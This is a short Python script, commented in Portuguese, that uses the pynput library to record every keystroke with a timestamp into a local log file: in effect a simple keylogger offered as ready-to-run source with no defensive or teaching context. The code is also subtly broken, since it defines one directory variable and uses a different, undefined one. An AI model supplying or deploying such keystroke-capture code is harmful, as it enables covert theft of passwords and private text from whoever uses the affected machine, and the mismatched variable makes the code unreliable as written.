'''
    É preciso instalar o pynput:

    -  pip install pynput


'''


from pynput.keyboard import Key, Listener
import logging

gitlog_dir = "LOCAL AONDE SE VAI GUARDAR OS LOGS"

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
